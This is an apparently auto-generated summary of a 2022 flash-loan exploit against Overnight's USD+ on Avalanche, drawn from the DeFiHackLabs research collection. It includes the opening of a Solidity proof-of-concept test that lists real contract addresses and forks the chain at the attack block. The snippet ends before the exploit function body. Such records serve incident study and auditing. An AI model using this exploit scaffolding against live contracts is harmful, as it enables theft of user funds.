# [?] - OverNight - FlashLoan Attack

## Summary
Severity: Unknown
Chain: Avalanche
Component: Overnight
Published: 2022-12-02
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Overnight_exp.sol
Type: defi-exploit-poc

## Details
Lost: 170k
References:
- https://twitter.com/peckshield/status/1598704809690877952
- https://snowtrace.io/address/0xfe2c4cb637830b3f1cdc626b99f31b1ff4842e2c

```solidity
contract ContractTest is Test {
    JoeRouter Router = JoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    SicleRouter sicleRouter = SicleRouter(0xC7f372c62238f6a5b79136A9e5D16A2FD7A3f0F5);
    USDPlus USDplus = USDPlus(0x73cb180bf0521828d8849bc8CF2B920918e23032);
    SwapFlashLoan Swap = SwapFlashLoan(0xED2a7edd7413021d440b09D654f3b87712abAB66);
    IAaveFlashloan LendingPoolV2 = IAaveFlashloan(0x4F01AeD16D97E3aB5ab2B501154DC9bb0F1A5A2C);
    IAaveFlashloan PoolV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    BenqiFinance Benqi = BenqiFinance(0x486Af39519B4Dc9a7fCcd318217352830E8AD9b4);
    BenqiChainlinkOracle Oracle = BenqiChainlinkOracle(0x316aE55EC59e0bEb2121C0e41d4BDef8bF66b32B);
    QiUSDCn qiUSDCn = QiUSDCn(0xB715808a78F6041E46d61Cb123C9B4A27056AE9C);
    PlatypusFinance Platypus = PlatypusFinance(0x66357dCaCe80431aee0A7507e2E361B7e2402370);
    QiUSDC qiUSDC = QiUSDC(0xBEb5d47A3f720Ec0a390d04b4d41ED7d9688bC7F);
    NetAsset netAsset = NetAsset(0xc2c84ca763572c6aF596B703Df9232b4313AD4e3);
    TotalNetAsset totalNetAsset = TotalNetAsset(0x9Af655c4DBe940962F776b685d6700F538B90fcf);
    IERC20 USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 nUSD = IERC20(0xCFc37A6AB183dd4aED08C204D1c2773c0b1BDf46);
    IERC20 DAI_e = IERC20(0xd586E7F844cEa2F87f50152665BCbc2C279D8d70);
    IERC20 USDT_e = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 nUSDLP = IERC20(0xCA87BF3ec55372D9540437d7a86a7750B42C02f4);
    address avUSDC = 0x46A51127C3ce23fb7AB1DE06226147F446e4a857;
    uint256 PoolV2BorrowAmount;
    uint256 amountBuy;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("avalanche", 23_097_846);
    }

    function testExploit() public payable {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Overnight_exp.sol_
